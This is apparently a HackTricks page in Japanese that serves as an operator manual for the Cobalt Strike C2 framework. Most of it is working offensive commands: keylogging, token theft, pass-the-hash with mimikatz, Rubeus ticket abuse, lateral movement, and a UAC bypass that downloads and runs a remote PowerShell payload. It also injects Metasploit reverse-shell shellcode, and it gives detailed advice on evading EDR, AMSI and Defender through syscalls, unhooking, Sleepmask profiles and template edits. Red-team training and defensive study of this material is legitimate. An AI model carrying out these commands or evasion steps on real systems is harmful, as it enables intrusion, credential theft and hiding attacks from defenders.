# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` から、どこで listen するか、使用する beacon の種類（http、dns、smb...）などを選択できます。

### Peer2Peer Listeners

これらの listener の beacon は C2 と直接通信する必要はなく、他の beacon を介して通信できます。

`Cobalt Strike -> Listeners -> Add/Edit` から TCP beacon または SMB beacon を選択します。

* **TCP beacon は、選択したポートに listener を設定します**。TCP beacon に接続するには、別の beacon からコマンド `connect <ip> <port>` を使用します。
* **smb beacon は、選択した名前の pipename で listen します**。SMB beacon に接続するには、コマンド `link [target] [pipe]` を使用します。

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* **`HTMLApplication`** は HTA ファイル用
* **`MS Office Macro`** は macro を含む office ドキュメント用
* **`Windows Executable`** は .exe、.dll、または service .exe 用
* **`Windows Executable (S)`** は **stageless** .exe、.dll、または service .exe 用（staged よりも stageless の方が優れており、IoCs が少ない）

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` では、bitsadmin、exe、powershell、python などの形式で、Cobalt Strike から beacon をダウンロードする script/executable が生成されます。

#### Host Payloads

Web sever で host したいファイルがすでにある場合は、`Attacks -> Web Drive-by -> Host File` に移動し、host するファイルと web server の設定を選択します。

### Beacon Options

<details>
<summary>Beacon options and commands</summary>
```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # Uses the highest supported PowerShell version (not OPSEC-friendly)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Without /run, Mimikatz spawns cmd.exe; an interactive desktop user may see the shell (SYSTEM sessions are not normally visible)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket on the attacker machine from a PowerShell session and load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump an interesting ticket by LUID
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   WMI lateral movement with an MSBuild inline C# task (OPSEC)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On the Metasploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Generate stageless Beacon shellcode: go to Attacks > Packages > Windows Executable (S), select the listener, choose Raw output, and enable the x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```
</details>

### カスタム implants / Linux Beacons

- カスタム agent は、register/check-in してタスクを受信するために、Cobalt Strike Team Server の HTTP/S protocol（default malleable C2 profile）を話せればよい。profile で定義された同じ URI/headers/metadata crypto を実装することで、タスク付与と出力に Cobalt Strike UI を再利用できる。<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
- Aggressor Script（例: `CustomBeacon.cna`）で non-Windows beacon の payload generation をラップすれば、operator は listener を選択し、GUI から直接 ELF payloads を生成できる。
- Team Server に公開する Linux task handlers の例: `sleep`、`cd`、`pwd`、`shell`（任意の command を実行）、`ls`、`upload`、`download`、`exit`。これらは Team Server が想定する task IDs に対応し、適切な format で output を返すよう server-side で実装する必要がある。
- Linux 上の BOF support は、[TrustedSec's ELFLoader](https://github.com/trustedsec/ELFLoader)（Outflank-style BOFs にも対応）を使って Beacon Object Files を in-process で load することで追加できる。これにより、新しい process を spawn せず、implant の context/privileges 内で modular post-exploitation を実行できる。<sup>[[2]](#references)[[3]](#references)</sup>
- カスタム beacon に SOCKS handler を組み込み、Windows Beacons との pivoting parity を維持する。operator が `socks <port>` を実行すると、implant は local proxy を開き、compromised Linux host 経由で operator tooling を internal networks に route できるようにする。

## Opsec

### Execute-Assembly

**`execute-assembly`** は、remote process injection を使用して **sacrificial process** 内で指定された program を実行する。process に inject する際にはすべての EDR がチェックしている特定の Win APIs が使用されるため、これは非常に noisy である。ただし、同じ process 内で何かを load するために使用できる custom tools がいくつかある。

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- Cobalt Strike では BOF (Beacon Object Files) も使用できる: [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

agressor script `https://github.com/outflanknl/HelpColor` は Cobalt Strike に `helpx` command を作成する。この command は、command が BOFs（green）、Frok&Run（yellow）などであるか、または ProcessExecution、injection など（red）であるかを示す color を付ける。これにより、どの command がより stealthy であるかを把握しやすくなる。

### Modern in-process post-execution

Recent versions では、classic COFF BOF の制約が大きすぎる場合に、次の 2 つの alternatives が追加されている。

- **Beacon Interpreter** は Team Server 上で C を intermediate bytecode に compile し、Beacon に embedded された VM 内で実行する。bytecode は native executable code ではなく data として保持されるため、BOF を load する際に通常必要となる追加の executable allocation と RW-to-RX permission transition を回避できる。Scripts は Beacon API を import し、BOF-style Dynamic Function Resolution (DFR) prototypes を declare できる。
- **BOF-PE** は complete EXE または DLL を current Beacon に load する。この format は通常の PE imports、exception handling、より豊富な C++、external libraries を support しながら、Beacon API を維持する。これは小規模な COFF BOF より重いため、追加の runtime が有用な場合にのみ選択する。
```bash
# Compile a C script on the Team Server and execute its bytecode
beacon-interpreter /path/to/script.c

# Execute a BOF-PE in the current Beacon
inline-execute-pe /path/to/tool.x64.exe
```
これらのメカニズムは loader 関連のシグナルを低減しますが、script のアクションや Windows API calls によって生成される telemetry は低減しません。<sup>[[8]](#references)</sup>

### ユーザーとして振る舞う

`Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents` のような events を確認できます。

- Security EID 4624 - 通常の稼働時間を把握するため、すべての interactive logons を確認します。
- System EID 12,13 - shutdown/startup/sleep の頻度を確認します。
- Security EID 4624/4625 - inbound の有効な/無効な NTLM attempts を確認します。
- Security EID 4648 - plaintext credentials が logon に使用されたときに、この event が作成されます。process がこれを生成した場合、その binary は config file または code 内に credentials を clear text で保持している可能性があります。

cobalt strike から `jump` を使用する場合、新しい process をより正規のものに見せるため、`wmi_msbuild` method を使用する方が適しています。

### computer accounts を使用する

defender は、users が生成した奇妙な behaviours を確認し、**service accounts と `*$` のような computer accounts を monitoring の対象外にする**ことが一般的です。これらの accounts を使用して lateral movement や privilege escalation を実行できます。

### stageless payloads を使用する

Stageless payloads は、C2 server から second stage を download する必要がないため、staged payloads よりも noisy ではありません。つまり、initial connection 後に network traffic を生成しないため、network-based defenses によって検出される可能性が低くなります。

### Tokens & Token Store

tokens を盗んだり生成したりする場合は注意してください。EDR は thread tokens を enumerate し、process 内に存在する**別の user に属する token**や、SYSTEM の token さえ検出する可能性があります。

これにより、tokens を **beacon ごとに**保存できるため、同じ token を何度も盗む必要がなくなります。これは lateral movement や、盗んだ token を複数回使用する必要がある場合に便利です。

- `token-store steal <pid>`
- `token-store steal-and-use <pid>`
- token-store show
- `token-store use <id>`
- `token-store remove <id>`
- token-store remove-all

lateral movement を行う場合、通常は新しい token を生成したり pass the hash attack を実行したりするよりも、**token を盗む**方が適しています。

### Guardrails

Cobalt Strike には **Guardrails** という feature があり、defenders に検出される可能性のある特定の commands や actions の使用を防止できます。Guardrails は、lateral movement や privilege escalation に一般的に使用される `make_token`、`jump`、`remote-exec` などの特定の commands を block するよう設定できます。

さらに、repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) には、payload を実行する前に検討できる checks や ideas も含まれています。

### Tickets encryption

AD では tickets の encryption に注意してください。デフォルトでは、一部の tools が Kerberos tickets に RC4 encryption を使用します。これは AES encryption よりも安全性が低く、最新の environments ではデフォルトで AES が使用されます。これは、weak encryption algorithms を監視している defenders によって検出される可能性があります。

### デフォルトを避ける

Cobalt Stricke を使用すると、デフォルトで SMB pipes の名前は `msagent_####` と `"status_####"` になります。これらの名前を変更してください。Cobal Strike から、次の command で既存の pipes の名前を確認できます: `ls \\.\pipe\`

さらに、SSH sessions では `\\.\pipe\postex_ssh_####` という pipe が作成されます。`set ssh_pipename "<new_name>";` で変更してください。

また、poext exploitation attack では、pipes `\\.\pipe\postex_####` を `set pipename "<new_name>"` で変更できます。

Cobalt Strike profiles では、次のような項目も変更できます。

- `rwx` の使用を避ける
- process injection の動作方法（使用される APIs）を `process-inject {...}` block で設定する
- `post-ex {…}` block で "fork and run" の動作方法を設定する
- sleep time
- memory に load する binaries の max size
- `stage {...}` block による memory footprint と DLL content
- network traffic

### Sleepmask と BeaconGate

Sleepmask は、Beacon とその tracked heap allocations を dormant 状態の間に変換し、task execution のために復元します。現在の releases には evasive な default が用意されていますが、memory layout、allocation、または call-stack requirements が異なる場合には、custom Sleepmask BOFs が引き続き有用です。4.13 以降、default Sleepmask は BeaconGate 経由で proxied された APIs の return address も spoof します。<sup>[[8]](#references)</sup>

**BeaconGate** はこの設計を `Sleep` の先にも拡張します。選択された WinAPI calls は `FUNCTION_CALL` structures として表現され、Sleepmask BOF に forward されます。これにより、call の実行中に Beacon を mask できます。profile では group（`Comms`、`Core`、`Cleanup`、または `All`）全体、あるいは個別の APIs のみを gate できます。<sup>[[9]](#references)</sup>
```text
stage {
set sleep_mask "true";
set syscall_method "Indirect";

beacon_gate {
VirtualAlloc;       # Routed through BeaconGate
VirtualAllocEx;
InternetConnectA;
}
}
```
`beacon_gate` に登録された API では、gate が `syscall_method` より優先されます。登録されていない API では、設定済みの syscall method を引き続き使用できます。`beacon_gate disable` と `beacon_gate enable` により、runtime でこの機能を切り替えられます。`All` を無条件に有効化するのは避けてください。`ps` などのコマンドは `OpenProcess`/`CloseHandle` を繰り返し呼び出すため、すべての呼び出しで Beacon の mask と unmask が行われると CPU 使用率が急上昇する可能性があります。Sleepmask-VS は、live implant を通じて繰り返しテストすることなく、custom gate をデバッグできるように、mocked Beacon/Sleepmask state を提供します。<sup>[[9]](#references)</sup>

### Noisy proc injections

プロセスに code を inject する場合、通常は非常に noisy になります。これは、**通常のプロセスがこの操作を実行することはほとんどなく、これを行う方法も非常に限られているためです**。そのため、behaviour-based detection systems によって検出される可能性があります。さらに、EDR が network を scan して、**disk 上に存在しない code を含む thread** を検出することもあります（ただし、JIT を使用する browser などのプロセスでは、これは一般的に発生します）。例: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID and PPID relationships

新しいプロセスを spawn するときは、検出を避けるために、プロセス間の**通常の parent-child** relationship を維持することが重要です。svchost.exec が iexplorer.exe を実行している場合、通常の Windows 環境では svchost.exe は iexplorer.exe の parent ではないため、疑わしく見えます。

Cobalt Strike で新しい beacon を spawn すると、デフォルトでは **`rundll32.exe`** を使用するプロセスが作成され、新しい listener が実行されます。これはあまり stealthy ではなく、EDR によって容易に検出されます。さらに、`rundll32.exe` は args なしで実行されるため、より疑わしくなります。

以下の Cobalt Strike command を使用すると、新しい beacon を spawn する別のプロセスを指定でき、検出されにくくなります。
```bash
spawnto x86 svchost.exe
```
この設定 **`spawnto_x86` と `spawnto_x64`** は profile 内でも変更できます。

### attacker の traffic を Proxying する

Attacker は、Linux マシン上であっても tools をローカルで実行し、victim の traffic をその tool に到達させる必要がある場合があります（例: NTLM relay）。

さらに、pass-the.hash や pass-the-ticket attack を実行する場合、victim マシンの LSASS process を変更する代わりに、**この hash または ticket を自身の LSASS process にローカルで追加**し、そこから pivot するほうが stealthy な場合があります。

ただし、**生成される traffic には注意**が必要です。backdoor process から一般的ではない traffic（kerberos?）を送信する可能性があるためです。この場合、browser process に pivot できます（ただし、自分自身を process に injecting しているところを検知される可能性があるため、これを stealthy に行う方法を考えてください）。


### AV を回避する

#### AV/AMSI/ETW Bypass

次のページを確認してください:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

通常、`/opt/cobaltstrike/artifact-kit` には、Cobalt Strike が binary beacon を生成するために使用する payload の code と pre-compiled template（`/src-common` 内）があります。

生成した backdoor（または compiled template のみ）に対して [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) を使用すると、何が Defender を trigger しているのかを確認できます。通常、それは string です。そのため、backdoor を生成する code を変更し、最終的な binary にその string が現れないようにできます。

code を変更したら、同じ directory から `./build.sh` を実行し、`dist-pipe/` folder を Windows client の `C:\Tools\cobaltstrike\ArtifactKit` にコピーします。
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
攻撃的な script `dist-pipe\artifact.cna` を忘れずに load してください。これにより、Cobalt Strike は load 済みのリソースではなく、指定した disk 上のリソースを使用します。

#### Resource Kit

ResourceKit フォルダーには、PowerShell、VBA、HTA を含む Cobalt Strike の script-based payloads 用テンプレートが含まれています。

テンプレートと [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) を使用すると、defender（この場合は AMSI）が何を問題視しているのかを特定し、変更できます：
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
検出された行を変更することで、検知されないテンプレートを生成できます。

攻撃的な script `ResourceKit\resources.cna` を読み込むことを忘れないでください。これにより、Cobalt Strike に対して、ロード済みのリソースではなく、指定したディスク上のリソースを使用するよう指示できます。

#### Function hooks | Syscall

Function hooking は、悪意のあるアクティビティを検出するための非常に一般的な EDRs の手法です。Cobalt Strike では、標準の Windows API 呼び出しの代わりに **syscalls** を使用することで、これらの hook を bypass できます。これは **`None`** config で行えます。また、**`Direct`** 設定で関数の `Nt*` バージョンを使用するか、malleable profile の **`Indirect`** オプションで `Nt*` 関数を単に飛び越すこともできます。システムによっては、ある option のほうが他より stealthy な場合があります。

これは profile または **`syscall-method`** command で設定できます。

ただし、これによって noise が発生する可能性もあります。

Cobalt Strike で function hooks を bypass するために提供されている option の1つは、[**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof) を使用して hook を削除することです。

[**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) または [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector) を使用して、どの function が hook されているか確認することもできます。




<details>
<summary>Misc Cobalt Strike commands</summary>
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```
</details>



## References

- [1] [Cobalt Strike Linux Beacon（custom implant PoC）](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [2] [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [3] [Outflank nix BOF template](https://github.com/outflanknl/nix_bof_template)
- [4] [Cobalt Strike metadata encryptionのUnit42による分析](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [5] [Cobalt Strike trafficに関するSANS ISC diary](https://isc.sans.edu/diary/27968)
- [6] [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [7] [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)
- [8] [Cobalt Strike 4.13：翻訳の迷宮](https://www.cobaltstrike.com/blog/cobalt-strike-413-lost-in-translation)
- [9] [Cobalt Strike 4.10：BeaconGateを通過して](https://www.cobaltstrike.com/blog/cobalt-strike-410-through-the-beacongate?p=6046)
{{#include ../banners/hacktricks-training.md}}
